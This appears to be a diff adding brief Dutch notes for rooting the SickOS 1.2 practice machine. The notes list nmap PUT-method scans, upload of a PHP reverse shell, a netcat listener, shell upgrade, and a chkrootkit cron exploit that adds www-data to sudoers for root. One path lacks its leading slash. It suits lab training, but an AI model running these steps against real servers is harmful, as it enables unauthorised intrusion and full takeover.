@@ -1,0 +1,33 @@
+Webserver SickOS 1.2
+
+* nmap -vv <IP adres>
+
+* nmap <ip adres> -p 80 --script http-methods --script-args http-methods.url-path='/test'
+
+- PHP-reverse-shell script wijzigen naar juiste IP adress en port.
+
+* nmap -p 80 <IP adres> --script http-put --script-args http-put.url='/test/test.php',http-put.file='test.php'
+
+* nc -nlvp 443
+
+- open de path via webbrowser
+
+* python -c "import pty; pty.spawn('/bin/bash')"
+
+* cd /etc/cron.daily
+
+* dpkg -l | grep chkrootkit
+
+* cd /etc
+
+* echo "echo 'www-data ALL=NOPASSWD: ALL' >>/etc/sudoers" >tmp/update
+
+*chmod 777 /tmp/update
+
+*id
+
+* python -c "import pty; pty.spawn('/bin/bash')"
+
+*sudo su
+
+*whoami
